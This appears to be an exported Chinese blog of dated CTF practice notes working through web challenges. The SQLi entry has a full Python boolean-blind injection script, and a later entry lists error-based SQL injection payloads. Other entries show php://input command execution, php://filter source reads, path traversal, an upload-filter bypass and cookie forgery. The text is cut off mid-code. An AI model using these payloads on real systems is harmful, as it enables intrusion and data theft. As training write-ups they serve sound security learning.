    <content type="html"><![CDATA[<p>象棋（ichuqiu）<br>昨天就做到的题，猫腻在源码里就能找到，js链接是个正则表达式，不过之前一直想着的是用python做，但是只会单线程的我半天没找到答案。<br>今天看wp突然醒悟用bp就挺好的，成功爆破flag<br><a id="more"></a></p><hr><p>SQLi(ichunqiu)<br>收获颇多的一道题<br>进入就是登录界面，尝试admin为用户名一次就对，想着直接爆破结果失败了。发现回显只有username error!以及password error!两种，bool盲注<br>先试试过滤点，发现后缀是%时报错时sprintf参数问题，查找关于sprintf的漏洞找到这篇<a href="https://zhuanlan.zhihu.com/p/115777073" target="_blank" rel="noopener">文章</a><br>应该就是单引号逃逸闭合来注入<br>构造payload:  </p><ul><li>admin%1$\’ or 1=1— 回显password error!</li><li>admin%1$\’ or 1=2— 回显username error!<br>可见可以通过or后面表达式的布尔值真假进行bool盲注<pre><code class="hljs go"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> <span class="hljs-keyword">string</span>url =  <span class="hljs-string">"http://5e2c1c23ad44440f9ba4d92351e69666afb9ede320b748f3.changame.ichunqiu.com/"</span>dir  = <span class="hljs-keyword">string</span>.digits+<span class="hljs-keyword">string</span>.ascii_letters+  <span class="hljs-string">"!@#$%^&amp;*()_+&#123;&#125;-="</span>right =  <span class="hljs-string">"password error!"</span>#猜数据库长度--<span class="hljs-number">-3</span><span class="hljs-keyword">for</span> i in <span class="hljs-keyword">range</span>(<span class="hljs-number">30</span>):data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">"admin%1$\\' or (length(database())="</span>+str(i)+<span class="hljs-string">")-- "</span>,<span class="hljs-string">'password'</span>:<span class="hljs-string">"password"</span>&#125;response = requests.post(url,data=data).text<span class="hljs-built_in">print</span>(<span class="hljs-string">"..."</span>+str(i))<span class="hljs-keyword">if</span> right in response:<span class="hljs-built_in">print</span>(<span class="hljs-string">"the length of database_name is"</span>+str(i))<span class="hljs-keyword">break</span></code></pre><pre><code class="hljs routeros"><span class="hljs-comment">#爆数据库---ctf</span>database_name = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,4):<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dir:payload = <span class="hljs-string">"admin%1$\\' or (ascii(substr(database(),&#123;0&#125;,1))="</span>+str(ord(c))+<span class="hljs-string">")-- "</span>data = &#123;<span class="hljs-string">'username'</span>:payload.format(i),<span class="hljs-string">'password'</span>:<span class="hljs-string">"password"</span>&#125;response = requests.post(url,<span class="hljs-attribute">data</span>=data).text<span class="hljs-builtin-name">print</span>(payload.format(i)+<span class="hljs-string">"..."</span>)<span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> response:database_name+=c<span class="hljs-builtin-name">print</span>(<span class="hljs-string">"okkkkkkkkkkkkkkkkkkk"</span>+c)break<span class="hljs-builtin-name">print</span>(database_name)</code></pre><pre><code class="hljs sql"><span class="hljs-comment">#爆表长度----4</span><span class="hljs-comment">#试着数据库名写成'ctf'发现不行，ctf写成asciihex编码形式0x637466成功注入</span><span class="hljs-comment">#注意使用limit 0,1限定查询</span>table_name = ''for i in range(30):payload = "admin%1$\\' or (<span class="hljs-keyword">select</span> <span class="hljs-keyword">length</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-number">0x637466</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">"+str(i)+"</span><span class="hljs-comment">-- "</span><span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">'username'</span>:payload,<span class="hljs-string">'password'</span>:<span class="hljs-string">"password"</span>&#125;response = requests.post(<span class="hljs-keyword">url</span>,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).textprint(payload+<span class="hljs-string">"..."</span>)<span class="hljs-keyword">if</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">in</span> response:print(<span class="hljs-string">"------------------"</span>+<span class="hljs-keyword">str</span>(i))break</code></pre><pre><code class="hljs sql"><span class="hljs-comment">#爆表名----flag</span>table_name = ''for i in range(1,5):for c in dir:payload = "admin%1$\\' or ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>))=<span class="hljs-string">"+str(ord(c))+"</span><span class="hljs-comment">-- "</span><span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">'username'</span>:payload.format(i),<span class="hljs-string">'password'</span>:<span class="hljs-string">"password"</span>&#125;response = requests.post(<span class="hljs-keyword">url</span>,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).textprint(payload.format(i)+<span class="hljs-string">"..."</span>)<span class="hljs-keyword">if</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">in</span> response:table_name+=cprint(<span class="hljs-string">"-------------------"</span>+c)breakprint(table_name)</code></pre><pre><code class="hljs sql"><span class="hljs-comment">#爆列长度---4</span>for i in range(30):payload = "admin%1$\\' or (<span class="hljs-keyword">select</span> <span class="hljs-keyword">length</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name = <span class="hljs-number">0x666c6167</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">"+str(i)+"</span><span class="hljs-comment">-- "</span><span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">'username'</span>:payload,<span class="hljs-string">'password'</span>:<span class="hljs-string">'password'</span>&#125;response = requests.post(<span class="hljs-keyword">url</span>,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).textprint(payload)<span class="hljs-keyword">if</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">in</span> response:print(<span class="hljs-string">"--------------------"</span>+<span class="hljs-keyword">str</span>(i))break</code></pre><pre><code class="hljs routeros"><span class="hljs-comment">#爆列名---flag</span>column_name = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,5):<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dir:payload = <span class="hljs-string">"admin%1$\\' or ascii(substr((select column_name from information_schema.columns where table_name = 0x666c6167 limit 0,1),&#123;0&#125;,1))="</span>+str(ord(c))+<span class="hljs-string">"-- "</span>data = &#123;<span class="hljs-string">'username'</span>:payload.format(i),<span class="hljs-string">'password'</span>:<span class="hljs-string">'password'</span>&#125;response = requests.post(url,<span class="hljs-attribute">data</span>=data).text<span class="hljs-builtin-name">print</span>(payload.format(i))<span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> response:column_name+=c<span class="hljs-builtin-name">print</span>(<span class="hljs-string">"------------"</span>+c)break<span class="hljs-builtin-name">print</span>(column_name)</code></pre><pre><code class="hljs routeros"><span class="hljs-comment">#爆flag</span><span class="hljs-comment">#懒得爆长度了，直接上</span><span class="hljs-attribute">flag</span>=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  range(1,100):<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span>  dir:payload =  <span class="hljs-string">"admin%1$\\' or ascii(substr((select flag from flag limit 0,1),&#123;0&#125;,1))="</span>+str(ord(c))+<span class="hljs-string">"-- "</span>data = &#123;<span class="hljs-string">'username'</span>:payload.format(i),<span class="hljs-string">'password'</span>:<span class="hljs-string">'password'</span>&#125;response = requests.post(url,<span class="hljs-attribute">data</span>=data).text<span class="hljs-builtin-name">print</span>(payload.format(i))<span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> response:flag+=c<span class="hljs-builtin-name">print</span>(<span class="hljs-string">"------------"</span>+c)break<span class="hljs-keyword">if</span> c ==  <span class="hljs-string">'&#125;'</span>:break<span class="hljs-builtin-name">print</span>(flag)</code></pre></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-20</title>
    <link href="/2020/09/20/20-09-20/"/>
    <url>/2020/09/20/20-09-20/</url>
    
    <content type="html"><![CDATA[<p>悄悄参加了tokyoctf，结果除了签到题就会一个，web全是用python flask框架，完全懵逼。感觉web好难啊，有点受到打击。<br><a id="more"></a></p><hr><p>GetFlag(ichunqiu)<br>打开链接被正常嘲讽，还是提示了登录可以下载文件获得flag啥的。看源码没有发现有啥问题，登录呗。<br>除了账号密码还有个验证码，每次刷新会变。起初是脚本md5生成验证码加SQL注入，但是先手注尝试admin’— 就直接成功了。。。<br>登录后果然有三个文件可以下载，最后的a.php提示flag在根目录,根据源码中三个文件的下载链接知道是在./file/download.php?f=filename.php下载文件，尝试../寻找根目录以及伪协议读取但一直得到flag{wow!!!but not true}，应该是被过滤了，尝试大写双写绕过均失败<br>网上找wp知道Linux web网站的默认路径 /var/www/html，构造payload: f= /var/www/html/flag.php不行，再试f=/var/www/html/Challenges/flag.php成功下载flag.php文件<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$f = $_POST[<span class="hljs-string">'flag'</span>];</span><span class="php">$f = str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">'`'</span>, <span class="hljs-string">'$'</span>, <span class="hljs-string">'*'</span>, <span class="hljs-string">'#'</span>, <span class="hljs-string">':'</span>, <span class="hljs-string">'\\'</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">"'"</span>, <span class="hljs-string">'('</span>, <span class="hljs-string">')'</span>, <span class="hljs-string">'.'</span>, <span class="hljs-string">'&gt;'</span>), <span class="hljs-string">''</span>, $f);</span><span class="php"><span class="hljs-keyword">if</span>((strlen($f) &gt; <span class="hljs-number">13</span>) || (<span class="hljs-keyword">false</span> !== stripos($f, <span class="hljs-string">'return'</span>)))</span><span class="php">&#123;</span><span class="php"><span class="hljs-keyword">die</span>(<span class="hljs-string">'wowwwwwwwwwwwwwwwwwwwwwwwww'</span>);</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">try</span></span><span class="php">&#123;</span><span class="php"> <span class="hljs-keyword">eval</span>(<span class="hljs-string">"\$spaceone = $f"</span>);</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">catch</span> (<span class="hljs-keyword">Exception</span> $e)</span><span class="php">&#123;</span><span class="php"><span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">if</span> ($spaceone === <span class="hljs-string">'flag'</span>)&#123;</span><span class="php"><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">"helloctf.php"</span>);</span><span class="php">&#125;</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>flag.php网页下构造flag=flag;查看源码得到flag<br>起初一直用bp拦包传参，但是这道题不行，用hackBar对比后发现hackbar加了请求头Content-Type: application/x-www-form-urlencoded</p><p><a href="https://blog.csdn.net/iamsongyu/article/details/84567438" target="_blank" rel="noopener">CTF-web Linux中几个关键的文件</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-18</title>
    <link href="/2020/09/18/20-09-18/"/>
    <url>/2020/09/18/20-09-18/</url>
    
    <content type="html"><![CDATA[<p>感觉还是好多不会，知识点太散了。。: )</p><a id="more"></a><hr><p>include(ichunqiu)<br>phpinfo()中发现allow_url_include是打开的，可以用php://input<br><code>&lt;?php system(&quot;ls&quot;);?&gt;</code>得到目录<br><code>&lt;?php system(&quot;cat file_name&quot;);?&gt;</code>得到flag<br>或者用php://filter得到flag</p><hr><p>破译(ichunqiu)<br>根据flag四个字符猜测移位密码以及各种英文猜测即可得到解密后的flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-9-17</title>
    <link href="/2020/09/17/20-9-17/"/>
    <url>/2020/09/17/20-9-17/</url>
    
    <content type="html"><![CDATA[<p>NaNNaNNaNNaN-Batman（xctf）<br>下载附件后发现是一段混乱的js代码，发现eval函数，可能是js混淆加密，和昨天的题类似。直接输入到控制台生成一个提交界面，通过console.log()把混淆的js代码解密得到以下内容：<br><a id="more"></a><br><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">$</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">var</span>  e=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"c"</span>).value;<span class="hljs-keyword">if</span>(e.length==<span class="hljs-number">16</span>)<span class="hljs-keyword">if</span>(e.match(<span class="hljs-regexp">/^be0f23/</span>)!=<span class="hljs-literal">null</span>)<span class="hljs-keyword">if</span>(e.match(<span class="hljs-regexp">/233ac/</span>)!=<span class="hljs-literal">null</span>)<span class="hljs-keyword">if</span>(e.match(<span class="hljs-regexp">/e98aa$/</span>)!=<span class="hljs-literal">null</span>)<span class="hljs-keyword">if</span>(e.match(<span class="hljs-regexp">/c7be9/</span>)!=<span class="hljs-literal">null</span>)&#123;<span class="hljs-keyword">var</span>  t=[<span class="hljs-string">"fl"</span>,<span class="hljs-string">"s_a"</span>,<span class="hljs-string">"i"</span>,<span class="hljs-string">"e&#125;"</span>];<span class="hljs-keyword">var</span>  n=[<span class="hljs-string">"a"</span>,<span class="hljs-string">"_h0l"</span>,<span class="hljs-string">"n"</span>];<span class="hljs-keyword">var</span>  r=[<span class="hljs-string">"g&#123;"</span>,<span class="hljs-string">"e"</span>,<span class="hljs-string">"_0"</span>];<span class="hljs-keyword">var</span>  i=[<span class="hljs-string">"it'"</span>,<span class="hljs-string">"_"</span>,<span class="hljs-string">"n"</span>];<span class="hljs-keyword">var</span>  s=[t,n,r,i];<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span>  o=<span class="hljs-number">0</span>;o&lt;<span class="hljs-number">13</span>;++o)&#123;<span class="hljs-built_in">document</span>.write(s[o%<span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);s[o%<span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)&#125;&#125;&#125;<span class="hljs-built_in">document</span>.write(<span class="hljs-string">'&lt;input id="c"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'</span>);<span class="hljs-keyword">delete</span> _</code></pre><br>根据if语句构造提交字符串或者根据生成flag的代码直接写成flag都行</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-16</title>
    <link href="/2020/09/16/20-09-16/"/>
    <url>/2020/09/16/20-09-16/</url>
    
    <content type="html"><![CDATA[<p>虽然花了很多时间才得到flag居然莫名很开心。。。<br><a id="more"></a><br>江湖魔头(bugku)<br>进界面发现是个小游戏，查看源码发现链接指向wulin.php?action=start，没有其他信息，点进链接洗点界面，在源码上依然发现啥，继续游戏，大概是要挣钱买如来神掌。在源码上没有发现什么，想抓包修改发现请求头只有cookie，可以猜测相关角色数据信息就在cookie的user里，先url解码再base64解码，结果只得到一串乱码。。。<br>已经明确猫腻在cookie里，尝试寻找其相关代码，查看三个js文件，base,js和md5.js都比较好理解，但是script.js看不懂。。参考一下别人的wp发现这个js文件是加密混淆处理过的。<br><a href="https://strcpy.me/index.php/archives/213/" target="_blank" rel="noopener">js加密</a><br>把三个js文件复制到本地，通过console.log(p)得到script.js。这下终于看懂了，大致步骤就是将cookie是明文加密得到的，通过script.js提供的解密算法得到当前cookie的明文，修改后自己编写加密算法得到cookie，从而打败boss得到flag。<br><del>为啥会开心捏~(￣▽￣)~*，可能是开挂的感觉真好</del></p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-15</title>
    <link href="/2020/09/15/20-09-15/"/>
    <url>/2020/09/15/20-09-15/</url>
    
    <content type="html"><![CDATA[<p>一道时间盲注弄不出来，一道布尔盲注被暴力破解了。。注意补上<br><a id="more"></a></p><hr><p>Trim(bugku)<br>登录注册重置密码界面都尝试sql注入，发现只会提示mysql connect error!，用bp扫描目录发现clear.php，show.php，以及index.php会重定向到login.php，flag就在show.php里面。。</p><hr><p>文件上传2(湖湘杯)(bugku)<br>做的莫名其妙。。。<br><img src="/2020/09/15/20-09-15/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202020-09-15%20094700.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>总感觉最后一行是被人改的。。<br>图片链接和upload链接都没有用<br>看wp发现是用php filter。。<br>op=php://filter/read=convert.base64-encode/resource=index.php还是没有，改成resource=../index.php结果得到<em>Try it again and I will kill you! I freaking hate hackers!</em><br>想到点图片链接时跳到的是op=home，点upload链接跳到op=upload，猜测是不加php，于是构造payload:op=php://filter/read=convert.base64-encode/resource=index得到index.php源码。果然是过滤..以及自动加.php后缀，尝试op=php://filter/read=convert.base64-encode/resource=flag得到结果</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-14</title>
    <link href="/2020/09/14/20-09-14/"/>
    <url>/2020/09/14/20-09-14/</url>
    
    <content type="html"><![CDATA[<p> PHP_encrypt_1(ISCCCTF)(bugku)<br> 很简单的解密题，居然错了好几次。。<br> <a id="more"></a><br> php的求模运算得到的结果正负和被除数相同。。一直习惯了python的求模结果和除数相同，想着不用去处理负数情况，结果: )，早知道用python写了。<br> php: -5 % 3 = -2<br> python: -5 % 3 = 1<br> <pre><code class="hljs xml"> <span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decrypt</span><span class="hljs-params">($str)</span></span></span><span class="php">&#123;</span><span class="php">    $key = md5(<span class="hljs-string">'ISCC'</span>);</span><span class="php">    $klen = strlen($key);</span><span class="php">    $str = base64_decode($str);</span><span class="php">    $x = <span class="hljs-number">0</span>;</span><span class="php">    $data = <span class="hljs-string">""</span>;</span><span class="php">    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; strlen($str); $i++)&#123;</span><span class="php">        <span class="hljs-keyword">if</span>($x == $klen)</span><span class="php">        &#123;</span><span class="php">            $x = <span class="hljs-number">0</span>;</span><span class="php">        &#125;</span><span class="php">        $char .= $key[$x];</span><span class="php">        $x += <span class="hljs-number">1</span>;</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; strlen($str); $i++)&#123;</span><span class="php">        $tmp = ord($str[$i]) - ord($char[$i]);</span><span class="php">        <span class="hljs-keyword">while</span>($tmp &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//处理负数结果</span></span><span class="php">            $tmp += <span class="hljs-number">128</span>;</span><span class="php">        $data .= chr($tmp);</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">return</span> $data;</span><span class="php">&#125;</span><span class="php">$str = <span class="hljs-string">"fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA="</span>;</span><span class="php"><span class="hljs-keyword">echo</span> decrypt($str);</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre></p><hr><p>flag.php(bugku)<br>一个按钮没有用的表格，查看源码没发现什么问题，尝试flag.php页面存在但是没有任何内容，注意题目描述的hint，回到初始页面get传参hint，得到php代码，序列化Key传入cookie即可。注意Key没有初始化因此”Key”=””，以及序列化得到的;因为要传入cookie要url编码成%3b</p><hr>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-13</title>
    <link href="/2020/09/13/20-09-13/"/>
    <url>/2020/09/13/20-09-13/</url>
    
    <content type="html"><![CDATA[<p>多次(bugku)<br>id从1-5显示，id=5时提示SQL注入（使用url输入时的形式写）<br><a id="more"></a></p><ul><li>id=5’%23 (%23为#)，有回显</li><li>id=5’+or+1=1%23，显示error，考虑是关键字被过滤了</li><li>尝试加注释，没有效果</li><li>双写or，有回显</li><li>id=5’+oorrder+by+2%23有回显，3无回显,说明有两列</li><li>id=5’+union+select+null,null%23显示error，依次尝试双写union和select，发现这两个都被过滤了</li><li>id=0’+ununionion+seselectlect+1,2%23回显只有2，考虑只显示第二个参数</li><li>id=0’+ununionion+seselectlect+null,database()%23得到数据库名web1002-1</li><li>id=0’+ununionion+seselectlect+null,group_concat(table_name)+from+infoorrmation_schema.tables+where+table_schema=’web1002-1’%23得到表名flag1,hint</li><li>id=0’+ununionion+seselectlect+null,group_concat(column_name)+from+infoorrmation_schema.columns+where+table_name=’flag1’%23得到列名flag1,address</li><li>id=0’+ununionion+seselectlect+null,flag1+from+flag1%23得到flag，转小写提交发现不对</li><li>题目提示有两个flag</li><li><p>id=0’+ununionion+seselectlect+null,address+from+flag1%23得到下一关地址</p><p>进到下一关之后发现依然是SQL注入的题</p></li><li><p>id=1到id=7都是绿字，之后显示nobody</p></li><li>id=1’%23回显正常</li><li>id=1’+or+1=1%23回显正常</li><li>id=1’+and+1=2%23预料之中显示nobody，目前看来可以注入</li><li>id=1’+order+by+2%23正常回显，id=1’+order+by+3%23显示nobody并且有报错信息</li><li>id=1’+union+select+null,null%23显示nobody并且报错</li><li>考虑各种绕过都不行</li><li><p>注意到有报错信息，尝试报错注入</p><p>有关报错注入<a href="https://www.cnblogs.com/s1ye/p/8261979.html" target="_blank" rel="noopener">相关文章</a><br>使用extractvalue() payload</p></li><li>id=0’+and+extractvalue(1,concat(0x7e,database(),0x7e))%23在报错信息中得到数据库名web1002-2</li><li>id=1’+and+extractvalue(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=’web1002-2’),0x7e))%23得到表名class,flag2</li><li>id=1’+and+extractvalue(1,concat(0x7e,(select+group_concat(column_name)+from+information_schema.columns+where+table_name=’flag2’),0x7e))%23得到列名flag2,address</li><li>id=0’+and+extractvalue(1,concat(0x7e,(select+flag2+from+flag2),0x7e))%23得到flag，小写提交得到结果<br>其他报错注入快速一览</li><li><em>floor() payload:  and select count(</em>) from information_schema.tables group by concat(user(),floor(rand(0)<em>2))—</em></li><li><em>extractvalue() payload:  and extractvalue(1,concat(0x7e,user(),0x7e))—</em></li><li><em>updatexml() payload:  and updatexml(1,concat(0x7e,(select user()),0x7e),1)—</em></li><li><em>exp() payload:  and exp(~(select </em> from(select user())x))—*</li><li><em>geometrycollection() payload:  and geometrycollection((select </em> from(select <em> from(select user())a)b))—</em></li><li><em>multipoint() payload:  and multipoint((select </em> from(select <em> from(select user())a)b))—</em></li><li><em>polygon() payload:  and polygon((select </em> from(select <em> from(select user())a)b))—</em></li><li><em>multipolygon() payload:  and multipolygon((select </em> from(select <em> from(select user())a)b))—</em></li><li><em>linestring() payload:  and linestring((select </em> from(select <em> from(select user())a)b))—</em></li><li><em>multilinestring() payload:  and multilinestring((select </em> from(select <em> from(select user())a)b))—</em></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-12</title>
    <link href="/2020/09/12/20-09-12/"/>
    <url>/2020/09/12/20-09-12/</url>
    
    <content type="html"><![CDATA[<p>程序员本地网站(bugku)<br>显然是xff欺骗，bp拦包加上X-Forwarded-For: 127.0.0.1即可</p><a id="more"></a><hr><p>各种绕过<br>先补充一些小细节：</p><ul><li>无论get还是post传参，页面上的传参都只能传字符串</li><li>hash对数组无效，返回0</li></ul><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$b=$_GET[<span class="hljs-string">'b'</span>];</span><span class="php">var_dump($b);</span><span class="php">$c=$_POST[<span class="hljs-string">'c'</span>];</span><span class="php">var_dump($c);</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><p>b=1（或c）时，显示string(1) “1”<br>b(或c)[]=123时，显示array(1) { [0]=&gt; string(3) “123” }<br>b(或c)[]=1,2,3时，显示array(1) { [0]=&gt; string(5) “1,2,3” }</p><p>扯远了，开始做题<br>要uname和passwd不相等而sha1加密后的值相等，只需要传入数组。<br>id==’margin’，本想着让id=0，但是传参得到的id是字符串，无效，老老实实传入id=margin即可</p><hr><p>web8(bugku)<br>extract函数将传入的数组中的名值对变成变量名和变量值<br>fn是通过读文件流得到，使用fn=php://input从而输入流传参</p><hr><p>细心(bugku)<br>进去一看就是假的404界面。。。两个链接都没什么用，看源码和请求响应头都没有信息。<br>常规查看各种目录，在robots.txt发现目录resusl.php,进入显示不是管理员且ip被记录，以为是xff伪装发现没有，直接爆破x发现密码就是admin,传参x=admin得到flag</p><hr><p>getshell(bugku)<br>文件上传绕过WAF检测的题<br>随便上传一张照片，提交正常，POST表单提交文件，使用multipart/form-data编码方式，会有Content-Type检测文件类型，multipart/form-data严格小写，可以通过大写某个字母绕过这种WAF检测<br>上传jpg文件再bp拦包改回成php文件，同时绕过WAF检测，但是发现还是不行，虽然可以长传文件但是会变成jpg文件，考虑后缀黑名单，依次改后缀为php2,php3,php4,php5,phps,pht, phtm, phtml，在php5使成功上传得到flag</p><blockquote><p>关于WAF相关文章：<a href="http://www.lmxspace.com/2018/11/10/%E5%85%B3%E4%BA%8EWAF%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/" target="_blank" rel="noopener">关于WAF那些事</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-11</title>
    <link href="/2020/09/11/20-09-11/"/>
    <url>/2020/09/11/20-09-11/</url>
    
    <content type="html"><![CDATA[<p>bugku旧平台上的题没人维护。。</p><a id="more"></a><hr><p>你从哪里来(bugku)<br>注意Referer头要加<a href="http://(https://)协议头！！！" target="_blank" rel="noopener">http://(https://)协议头！！！</a></p><hr><p>md5 collision(NUPT_CTF)<br>bugku里没给出a的判别条件，裂开<br><pre><code class="hljs xml">\\bugku缺的源码代码<span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$md51 = md5(<span class="hljs-string">'QNKCDZO'</span>);</span><span class="php">$a = @$_GET[<span class="hljs-string">'a'</span>];</span><span class="php">$md52 = @md5($a);</span><span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($a))&#123;</span><span class="php"><span class="hljs-keyword">if</span> ($a != <span class="hljs-string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><span class="php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"nctf&#123;*****************&#125;"</span>;</span><span class="php">&#125; <span class="hljs-keyword">else</span> &#123;</span><span class="php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"false!!!"</span>;</span><span class="php">&#125;&#125;</span><span class="php"><span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"please input a"</span>;&#125;</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>要构造a使a != ‘QNKCDZO’并且md51==md52<br>md51=0e830400451993494058024219903391，根据php弱比较的特点：</p><blockquote><p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行</p></blockquote><p>只要md52也是0e开头的数字内容的字符串,他们转换为数值后都是0，即可使得md51==md52</p><p>补充：现在md5加密已经并不唯一，可以通过如“构造前缀碰撞法”进行哈希碰撞，使两个文件MD5值一致且都能正常运行，但是执行的内容不同。<a href="https://wooyun.js.org/drops/MD5%E7%A2%B0%E6%92%9E%E7%9A%84%E6%BC%94%E5%8C%96%E4%B9%8B%E8%B7%AF.html" target="_blank" rel="noopener">相关阅读</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-10</title>
    <link href="/2020/09/10/20-09-10/"/>
    <url>/2020/09/10/20-09-10/</url>
    
    <content type="html"><![CDATA[<p>这学期可好像会有点多 | 网安老师都喜欢说课会比较难 | 希望学到抽代的时候可以顺顺利利</p><a id="more"></a><hr><p>cookie欺骗(bugku)<br>进网页一串乱码，尝试base64解码没什么用，注意到url的filename参数有点奇怪，base64解码得到是keys.txt，那串乱码应该是他的内容。尝试各种常用目录base64加密到filename，发现就index.php，line=1时有一行php代码，尝试不同line得到不同行，python爬取全部内容得到：<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">error_reporting(<span class="hljs-number">0</span>);</span><span class="php">$file=base64_decode(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'filename'</span>])?$_GET[<span class="hljs-string">'filename'</span>]:<span class="hljs-string">""</span>);</span><span class="php">$line=<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'line'</span>])?intval($_GET[<span class="hljs-string">'line'</span>]):<span class="hljs-number">0</span>;</span><span class="php"><span class="hljs-keyword">if</span>($file==<span class="hljs-string">''</span>) header(<span class="hljs-string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><span class="php">$file_list =  <span class="hljs-keyword">array</span>(</span><span class="php"><span class="hljs-string">'0'</span>  =&gt;<span class="hljs-string">'keys.txt'</span>,</span><span class="php"><span class="hljs-string">'1'</span>  =&gt;<span class="hljs-string">'index.php'</span>,</span><span class="php">);</span><span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_COOKIE[<span 